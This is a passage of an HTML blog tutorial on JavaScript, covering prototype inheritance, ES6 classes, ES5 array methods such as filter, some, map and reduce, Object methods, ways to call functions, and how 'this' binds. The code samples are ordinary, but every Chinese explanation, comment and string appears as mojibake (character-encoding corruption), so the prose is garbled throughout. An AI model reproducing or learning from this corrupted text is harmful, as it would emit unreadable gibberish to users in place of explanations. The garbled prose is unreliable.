å¦‚æœåˆ©ç”¨å¯¹è±¡çš„å½¢å¼ä¿®æ”¹äº†åŸå‹å¯¹è±¡,åˆ«å¿˜äº†åˆ©ç”¨constructor æŒ‡å›åŸæ¥çš„æ„é€ å‡½æ•°</span></span><br><span class="line">Son.prototype.constructor = Son;</span><br><span class="line"><span class="comment">// è¿™ä¸ªæ˜¯å­æ„é€ å‡½æ•°ä¸“é—¨çš„æ–¹æ³•</span></span><br><span class="line">Son.prototype.exam = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;å­©å­è¦è€ƒè¯•&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son(<span class="string">&#x27;åˆ˜å¾·å&#x27;</span>, <span class="number">18</span>, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">console</span>.log(son); <span class="comment">// Son &#123; age: 18, score: 100, uname: &quot;åˆ˜å¾·å&quot;, __proto__: Father &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Father.prototype); <span class="comment">// æœ‰ money æ–¹æ³•ï¼Œæ—  exam æ–¹æ³•</span></span><br><span class="line"><span class="built_in">console</span>.log(Son.prototype.constructor); <span class="comment">// æŒ‡å‘Son</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/07/HfRFt4dpGuSsKVT.jpg" alt="Snipaste_2021-06-07_10-23-58.jpg"></p><h2 id="ç±»çš„æœ¬è´¨"><a href="#ç±»çš„æœ¬è´¨" class="headerlink" title="ç±»çš„æœ¬è´¨"></a><strong>ç±»çš„æœ¬è´¨</strong></h2><ol><li>classæœ¬è´¨è¿˜æ˜¯function.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¤ä¸ºç±»å°±æ˜¯æ„é€ å‡½æ•°çš„å¦ä¸€ç§å†™æ³•</li><li>ç±»æœ‰åŸå‹å¯¹è±¡prototypeï¼Œé‡Œé¢æœ‰constructor æŒ‡å‘ç±»æœ¬èº«ã€‚å¹¶ä¸”ç±»çš„æ‰€æœ‰æ–¹æ³•éƒ½å®šä¹‰åœ¨ç±»çš„prototypeå±æ€§ä¸Š</li><li>ç±»åˆ›å»ºçš„å®ä¾‹å¯¹è±¡é‡Œé¢ä¹Ÿæœ‰<code>__proto__ </code>åŸå‹æŒ‡å‘ç±»çš„prototypeåŸå‹å¯¹è±¡</li><li>ç±»ä¹Ÿå¯ä»¥é€šè¿‡åŸå‹å¯¹è±¡æ·»åŠ æ–¹æ³•</li><li>ES6çš„ç±»å…¶å®å°±æ˜¯è¯­æ³•ç³–:è¯­æ³•ç³–å°±æ˜¯ä¸€ç§ä¾¿æ·å†™æ³•.  ç®€å•ç†è§£, æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥å®ç°åŒæ ·çš„åŠŸèƒ½, ä½†æ˜¯ä¸€ç§å†™æ³•æ›´åŠ æ¸…æ™°ã€æ–¹ä¾¿,é‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±æ˜¯è¯­æ³•ç³–</li></ol><hr><h1 id="ES5-ä¸­çš„æ–°å¢æ–¹æ³•"><a href="#ES5-ä¸­çš„æ–°å¢æ–¹æ³•" class="headerlink" title="ES5 ä¸­çš„æ–°å¢æ–¹æ³•"></a>ES5 ä¸­çš„æ–°å¢æ–¹æ³•</h1><h2 id="æ•°ç»„æ–¹æ³•"><a href="#æ•°ç»„æ–¹æ³•" class="headerlink" title="æ•°ç»„æ–¹æ³•"></a><strong>æ•°ç»„æ–¹æ³•</strong></h2><p>è¿­ä»£(éå†)æ–¹æ³•ï¼šforEach()ã€map()ã€filter()ã€some()ã€every()ï¼›</p><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach()"></a>forEach()</h3><p><code>array.forEach(function(currentValue, index, arr))</code></p><ul><li>lcurrentValueï¼šæ•°ç»„å½“å‰é¡¹çš„å€¼</li><li>lindexï¼šæ•°ç»„å½“å‰é¡¹çš„ç´¢å¼•</li><li>larrï¼šæ•°ç»„å¯¹è±¡æœ¬èº«</li></ul><h3 id="filter"><a href="#filter" class="headerlink" title="filter()"></a>filter()</h3><p><code>array.filter(function(currentValue, index, arr))</code></p><ul><li><p>filter() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œæ–°æ•°ç»„ä¸­çš„å…ƒç´ æ˜¯é€šè¿‡æ£€æŸ¥æŒ‡å®šæ•°ç»„ä¸­ç¬¦åˆæ¡ä»¶çš„æ‰€æœ‰å…ƒç´ ,ä¸»è¦ç”¨äºç­›é€‰æ•°ç»„</p></li><li><p>æ³¨æ„å®ƒç›´æ¥è¿”å›ä¸€ä¸ª<strong>æ–°æ•°ç»„</strong></p></li><li><p>currentValue: æ•°ç»„å½“å‰é¡¹çš„å€¼</p></li><li><p>indexï¼šæ•°ç»„å½“å‰é¡¹çš„ç´¢å¼•</p></li><li><p>arrï¼šæ•°ç»„å¯¹è±¡æœ¬èº«</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">12</span>, <span class="number">66</span>, <span class="number">4</span>, <span class="number">88</span>, <span class="number">3</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value % <span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(newArr); <span class="comment">// [ 12,66,4,88 ]</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="some"><a href="#some" class="headerlink" title="some()"></a>some()</h3><p><code>array.some(function(currentValue, index, arr))</code></p><ul><li>some() æ–¹æ³•ç”¨äºæ£€æµ‹æ•°ç»„ä¸­çš„å…ƒç´ æ˜¯å¦æ»¡è¶³æŒ‡å®šæ¡ä»¶.  é€šä¿—ç‚¹ æŸ¥æ‰¾æ•°ç»„ä¸­æ˜¯å¦æœ‰æ»¡è¶³æ¡ä»¶çš„å…ƒç´  </li><li>æ³¨æ„å®ƒè¿”å›å€¼æ˜¯<strong>å¸ƒå°”å€¼</strong>, å¦‚æœæŸ¥æ‰¾åˆ°è¿™ä¸ªå…ƒç´ , å°±è¿”å›true ,  å¦‚æœæŸ¥æ‰¾ä¸åˆ°å°±è¿”å›false.</li><li>å¦‚æœæ‰¾åˆ°ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„å…ƒç´ ,åˆ™ç»ˆæ­¢å¾ªç¯. ä¸åœ¨ç»§ç»­æŸ¥æ‰¾.</li><li>currentValue: æ•°ç»„å½“å‰é¡¹çš„å€¼</li><li>indexï¼šæ•°ç»„å½“å‰é¡¹çš„ç´¢å¼•</li><li>arrï¼šæ•°ç»„å¯¹è±¡æœ¬èº«</li></ul><blockquote><p>forEach()ä¸some()åŒºåˆ«ï¼š</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>];</span><br><span class="line"><span class="comment">// 1. forEachè¿­ä»£ éå†</span></span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="string">&#x27;green&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æ‰¾åˆ°äº†è¯¥å…ƒç´ &#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// åœ¨forEach é‡Œé¢ return ä¸ä¼šç»ˆæ­¢è¿­ä»£</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// å¦‚æœæŸ¥è¯¢æ•°ç»„ä¸­å”¯ä¸€çš„å…ƒç´ , ç”¨someæ–¹æ³•æ›´åˆé€‚</span></span><br><span class="line">arr.some(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="string">&#x27;green&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æ‰¾åˆ°äº†è¯¥å…ƒç´ &#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//  åœ¨some é‡Œé¢ é‡åˆ° return true å°±ç»ˆæ­¢éå† è¿­ä»£æ•ˆç‡æ›´é«˜</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="string">&#x27;green&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æ‰¾åˆ°äº†è¯¥å…ƒç´ &#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//  // filter é‡Œé¢ return ä¸ä¼šç»ˆæ­¢è¿­ä»£</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h3><p><code>array.map(function(currentValue, index, arr), thisValue)</code></p><p><code>map()</code> æ–¹æ³•è¿”å›ä¸€ä¸ª<strong>æ–°æ•°ç»„</strong>ï¼Œæ•°ç»„ä¸­çš„å…ƒç´ ä¸ºåŸå§‹æ•°ç»„å…ƒç´ è°ƒç”¨å‡½æ•°å¤„ç†åçš„å€¼ã€‚å’ŒforEachç›¸ä¼¼ï¼Œä¸åŒåœ¨äºï¼š</p><p> å¦‚æœæ›´æ”¹æ•°ç»„å†…çš„å€¼ï¼Œ<code>forEach</code> ä¸èƒ½ç¡®ä¿æ•°ç»„çš„ä¸å˜æ€§ã€‚è¿™ä¸ªæ–¹æ³•åªæœ‰åœ¨ä½ ä¸æ¥è§¦é‡Œé¢çš„ä»»ä½•å€¼æ—¶ï¼Œæ‰èƒ½ä¿è¯ä¸å˜æ€§ã€‚</p><p> ç”±äºå®ƒä»¬ä¹‹é—´çš„ä¸»è¦åŒºåˆ«åœ¨äºæ˜¯å¦æœ‰è¿”å›å€¼ï¼Œæ‰€ä»¥ä½ ä¼šå¸Œæœ›ä½¿ç”¨ <code>map</code> æ¥åˆ¶ä½œä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œè€Œä½¿ç”¨ <code>forEach</code> åªæ˜¯ä¸ºäº†æ˜ å°„åˆ°æ•°ç»„ä¸Š(ä¿®æ”¹åŸæ¥çš„æ•°ç»„)ã€‚</p><p><strong>è¿”å›å€¼åŠ å…¥æ–°æ•°ç»„ä¸­</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> newarr = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value * <span class="number">2</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>mapçš„ä¸å˜æ€§ï¼šå½“æ•°ç»„ä¸ºåŸºç¡€ç±»å‹æ—¶åŸæ•°ç»„ä¸å˜</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">let</span> newArray=array.map(<span class="function">(<span class="params">item</span>) =&gt;</span> item*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(array); <span class="comment">// [1,2,3,4,5]</span></span><br><span class="line"><span class="built_in">console</span>.log(newArray);<span class="comment">//[2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure><p><strong>å½“æ•°ç»„ä¸ºå¼•ç”¨ç±»å‹æ—¶åŸæ•°ç»„å‘ç”Ÿæ”¹å˜ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array = [&#123; <span class="attr">name</span>: <span class="string">&#x27;Anna&#x27;</span>, <span class="attr">age</span>: <span class="number">16</span> &#125;, &#123; <span class="attr">name</span>: <span class="string">&#x27;James&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;]</span><br><span class="line"><span class="keyword">let</span> newArray=array.map(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    item.like=<span class="string">&#x27;eat&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(array); <span class="comment">// [&#123; name: &#x27;Anna&#x27;, age: 16,like: &quot;eat&quot;&#125;,&#123; name: &#x27;James&#x27;, age: 18,like: &quot;eat&quot;&#125;]</span></span><br><span class="line"><span class="built_in">console</span>.log(newArray);<span class="comment">//[&#123; name: &#x27;Anna&#x27;, age: 16,like: &quot;eat&quot;&#125;,&#123; name: &#x27;James&#x27;, age: 18,like: &quot;eat&quot;&#125;]</span></span><br></pre></td></tr></table></figure><h3 id="every"><a href="#every" class="headerlink" title="every()"></a>every()</h3><p><code>array.every(function(currentValue, index, arr), thisValue)</code></p><p><code>every()</code> æ–¹æ³•ç”¨äºæ£€æµ‹æ•°ç»„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½ç¬¦åˆæŒ‡å®šæ¡ä»¶</p><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce()"></a>reduce()</h3><p><code>arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])</code></p><ul><li>callbackï¼šå›è°ƒå‡½æ•°</li><li>initialValueï¼šåˆå§‹å€¼</li></ul><p><strong>å¯¹æ•°ç»„ä¸­æ‰€æœ‰å†…å®¹è¿›è¡Œæ±‡æ€»ï¼Œç‚¹åƒé€’å½’</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> total = a.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">preValue, currValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preValue + currValue;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// éå†åˆ°ç¬¬ä¸€æ¬¡æ—¶ï¼ŒpreValueä¸ºåˆå§‹å€¼ï¼ŒcurrValueä¸ºæ•°ç»„é‡Œçš„ç¬¬ä¸€ä¸ªå€¼</span></span><br><span class="line"><span class="comment">// éå†åˆ°ç¬¬äºŒæ¬¡æ—¶ï¼ŒpreValueä¸ºç¬¬ä¸€æ¬¡è¿”å›çš„å€¼ï¼ŒcurrValueä¸ºæ•°ç»„é‡Œç¬¬äºŒä¸ªæ•°</span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²æ–¹æ³•"><a href="#å­—ç¬¦ä¸²æ–¹æ³•" class="headerlink" title="å­—ç¬¦ä¸²æ–¹æ³•"></a>å­—ç¬¦ä¸²æ–¹æ³•</h2><p>trim() æ–¹æ³•ä¼šä»ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸¤ç«¯åˆ é™¤ç©ºç™½å­—ç¬¦ã€‚trim() æ–¹æ³•å¹¶ä¸å½±å“åŸå­—ç¬¦ä¸²æœ¬èº«ï¼Œå®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ã€‚</p><p><code>str.trim()</code></p><h2 id="å¯¹è±¡æ–¹æ³•"><a href="#å¯¹è±¡æ–¹æ³•" class="headerlink" title="å¯¹è±¡æ–¹æ³•"></a><strong>å¯¹è±¡</strong>æ–¹æ³•</h2><h3 id="Object-keys"><a href="#Object-keys" class="headerlink" title="Object.keys()"></a>Object.keys()</h3><p>Object.keys() ç”¨äºè·å–å¯¹è±¡è‡ªèº«æ‰€æœ‰çš„å±æ€§</p><p><code>Object.keys(obj)</code></p><ul><li>æ•ˆæœç±»ä¼¼ forâ€¦in</li><li>è¿”å›ä¸€ä¸ªç”±å±æ€§åç»„æˆçš„æ•°ç»„</li></ul><h3 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h3><p>Object.defineProperty() å®šä¹‰å¯¹è±¡ä¸­æ–°å±æ€§æˆ–ä¿®æ”¹åŸæœ‰çš„å±æ€§ã€‚(äº†è§£)</p><p><code>Object.defineProperty(obj, prop, descriptor)</code></p><ul><li>objï¼šå¿…éœ€ã€‚ç›®æ ‡å¯¹è±¡ </li><li>propï¼šå¿…éœ€ã€‚éœ€å®šä¹‰æˆ–ä¿®æ”¹çš„å±æ€§çš„åå­—</li><li>descriptorï¼šå¿…éœ€ã€‚ä»¥å¯¹è±¡å½¢å¼ { } ä¹¦å†™:<ul><li>value: è®¾ç½®å±æ€§çš„å€¼ é»˜è®¤ä¸ºundefined</li><li>writable: å€¼æ˜¯å¦å¯ä»¥é‡å†™ã€‚true | false é»˜è®¤ä¸ºfalse</li><li>enumerable: ç›®æ ‡å±æ€§æ˜¯å¦å¯ä»¥è¢«æšä¸¾ã€‚true | false é»˜è®¤ä¸º false</li><li>configurable: ç›®æ ‡å±æ€§æ˜¯å¦å¯ä»¥è¢«åˆ é™¤æˆ–æ˜¯å¦å¯ä»¥å†æ¬¡ä¿®æ”¹ç‰¹æ€§ true | false é»˜è®¤ä¸ºfalse</li></ul></li></ul><hr><h1 id="å‡½æ•°çš„å®šä¹‰å’Œè°ƒç”¨"><a href="#å‡½æ•°çš„å®šä¹‰å’Œè°ƒç”¨" class="headerlink" title="å‡½æ•°çš„å®šä¹‰å’Œè°ƒç”¨"></a>å‡½æ•°çš„å®šä¹‰å’Œè°ƒç”¨</h1><h2 id="å‡½æ•°çš„å®šä¹‰æ–¹å¼"><a href="#å‡½æ•°çš„å®šä¹‰æ–¹å¼" class="headerlink" title="å‡½æ•°çš„å®šä¹‰æ–¹å¼"></a><strong>å‡½æ•°çš„å®šä¹‰æ–¹å¼</strong></h2><ol><li>å‡½æ•°å£°æ˜æ–¹å¼ function å…³é”®å­— (å‘½åå‡½æ•°)  <code>function fn() &#123;&#125;;</code></li><li>å‡½æ•°è¡¨è¾¾å¼ (åŒ¿åå‡½æ•°)  <code>var fun = function() &#123;&#125;;</code></li><li>new Function(â€˜å‚æ•°1â€™,â€™å‚æ•°2â€™, â€˜å‡½æ•°ä½“â€™)  <strong>ï¼ˆäº†è§£å°±è¡Œï¼‰</strong></li><li>æ‰€æœ‰å‡½æ•°éƒ½æ˜¯ Function çš„å®ä¾‹(å¯¹è±¡) </li><li>å‡½æ•°ä¹Ÿå±äºå¯¹è±¡</li></ol><h2 id="å‡½æ•°çš„è°ƒç”¨æ–¹å¼"><a href="#å‡½æ•°çš„è°ƒç”¨æ–¹å¼" class="headerlink" title="å‡½æ•°çš„è°ƒç”¨æ–¹å¼"></a><strong>å‡½æ•°çš„</strong>è°ƒç”¨<strong>æ–¹å¼</strong></h2><ol><li><p>æ™®é€šå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">//something </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¯¹è±¡çš„æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">sayHi</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//somethin</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">o.sayHi();</span><br></pre></td></tr></table></figure></li><li><p>æ„é€ å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Star</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">new</span> Star();</span><br></pre></td></tr></table></figure></li><li><p>ç»‘å®šäº‹ä»¶å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;   <span class="comment">// ç‚¹å‡»äº†æŒ‰é’®å°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br></pre></td></tr></table></figure></li><li><p>å®šæ—¶å™¨å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;, <span class="number">1000</span>);  <span class="comment">//è¿™ä¸ªå‡½æ•°æ˜¯å®šæ—¶å™¨è‡ªåŠ¨1ç§’é’Ÿè°ƒç”¨ä¸€æ¬¡</span></span><br></pre></td></tr></table></figure></li><li><p>ç«‹å³æ‰§è¡Œå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//something</span></span><br><span class="line">&#125;)();  <span class="comment">// ç«‹å³æ‰§è¡Œå‡½æ•°æ˜¯è‡ªåŠ¨è°ƒç”¨</span></span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="å‡½æ•°å†…-this-çš„æŒ‡å‘"><a href="#å‡½æ•°å†…-this-çš„æŒ‡å‘" class="headerlink" title="å‡½æ•°å†… this çš„æŒ‡å‘"></a><strong>å‡½æ•°</strong>å†… <strong>this</strong> <strong>çš„</strong>æŒ‡å‘</h1><p>è¿™äº› this çš„æŒ‡å‘ï¼Œæ˜¯å½“æˆ‘ä»¬è°ƒç”¨å‡½æ•°çš„æ—¶å€™ç¡®å®šçš„ã€‚ è°ƒç”¨æ–¹å¼çš„ä¸åŒå†³å®šäº†this çš„æŒ‡å‘ä¸åŒ.ä¸€èˆ¬æŒ‡å‘æˆ‘ä»¬çš„è°ƒç”¨è€….</p><p><img src="https://i.loli.net/2021/06/07/BtNE9pdsyIrq6wk.jpg" alt="Snipaste_2021-06-07_11-16-40.jpg"></p><p>ä½†æ˜¯ç«‹å³æ‰§è¡Œå‡½æ•°è¿˜å¾—çœ‹è¿™æ—¶thisæ˜¯å¦åœ¨å¯¹è±¡æ–¹æ³•æˆ–è€…æ„é€ å‡½æ•°ä¸­ï¼Œç¬¬äºŒä¸ªè™½ç„¶æ˜¯ç«‹å³æ‰§è¡Œå‡½æ•°ï¼Œä½†æ˜¯å®ƒå…ˆæ‰¾çš„æ˜¯å…¨å±€å˜é‡fooï¼Œå†æ‰¾åˆ°foo.barï¼Œæ‰€ä»¥thisè¿”å›çš„æ˜¯fooä½œç”¨åŸŸçš„a</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">bar</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(foo.bar());            <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar)());          <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar=foo.bar)());  <span class="comment">//1</span></span><br></pre></td></tr></table></figure><p><strong>â€œåŒ¿åå‡½æ•°çš„æ‰§è¡Œç¯å¢ƒå…·æœ‰å…¨å±€æ€§â€</strong>ï¼Œæ‰€ä»¥æœ€é‡Œå±‚é‚£ä¸ªå‡½æ•°ä¸­thisæŒ‡å‘å…¨å±€ç¯å¢ƒï¼Œå…¨å±€ç¯å¢ƒæ²¡æœ‰å®šä¹‰fooå˜é‡æ‰€ä»¥è¾“å‡ºundefinedã€‚åœ¨åŒ¿åå‡½æ•°å¤–éƒ¨å°†thisä¿å­˜åˆ°ä¸€ä¸ªå†…éƒ¨å‡½æ•°å¯ä»¥è®¿é—®çš„å˜é‡selfä¸­ï¼Œå¯ä»¥é€šè¿‡selfè®¿é—®è¿™ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥self.fooä¸ºbar</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myobject = &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">    <span class="attr">func</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.foo);</span><br><span class="line">        <span class="built_in">console</span>.log(self.foo);</span><br><span class="line"></span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.foo);<span class="comment">//undefined</span></span><br><span class="line">            <span class="built_in">console</span>.log(self.foo);<span class="comment">//bar</span></span><br><span class="line">        &#125;)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">myobject.func();</span><br></pre></td></tr></table></figure><h2 id="ç±»çš„thisæŒ‡å‘"><a href="#ç±»çš„thisæŒ‡å‘" class="headerlink" title="ç±»çš„thisæŒ‡å‘"></a>ç±»çš„thisæŒ‡å‘</h2><p>ç±»çš„æ–¹æ³•å†…éƒ¨å¦‚æœå«æœ‰<code>this</code>ï¼Œå®ƒé»˜è®¤æŒ‡å‘ç±»çš„å®ä¾‹ã€‚ä½†æ˜¯ï¼Œå¿…é¡»éå¸¸å°å¿ƒï¼Œä¸€æ—¦å•ç‹¬ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œå¾ˆå¯èƒ½æŠ¥é”™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">printName</span>(<span class="params">name = <span class="string">&#x27;there&#x27;</span></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.print(<span class="string">`Hello <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">print</span>(<span class="params">text</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="keyword">const</span> &#123; printName &#125; = logger;</span><br><span class="line">printName(); <span class="comment">// TypeError: Cannot read property &#x27;print&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>printName</code>æ–¹æ³•ä¸­çš„<code>this</code>ï¼Œé»˜è®¤æŒ‡å‘<code>Logger</code>ç±»çš„å®ä¾‹ã€‚ä½†æ˜¯ï¼Œ<strong>å¦‚æœå°†è¿™ä¸ªæ–¹æ³•æå–å‡ºæ¥å•ç‹¬ä½¿ç”¨</strong>ï¼Œ<code>this</code>ä¼šæŒ‡å‘è¯¥æ–¹æ³•è¿è¡Œæ—¶æ‰€åœ¨çš„ç¯å¢ƒï¼ˆç”±äº class å†…éƒ¨æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œæ‰€ä»¥ this å®é™…æŒ‡å‘çš„æ˜¯<code>undefined</code>ï¼‰ï¼Œä»è€Œå¯¼è‡´æ‰¾ä¸åˆ°<code>print</code>æ–¹æ³•è€ŒæŠ¥é”™ã€‚</p><p>ï¼ˆ1ï¼‰ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ³•æ˜¯ï¼Œåœ¨æ„é€ æ–¹æ³•ï¼ˆconstructorï¼‰ä¸­ç»‘å®š<code>this</code>ï¼Œè¿™æ ·å°±ä¸ä¼šæ‰¾ä¸åˆ°<code>print</code>æ–¹æ³•äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.printName = <span class="built_in">this</span>.printName.bind(<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¦ä¸€ç§è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨ç®­å¤´å‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Obj</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.getThis = <span class="function">() =&gt;</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> myObj = <span class="keyword">new</span> Obj();</span><br><span class="line">myObj.getThis() === myObj <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 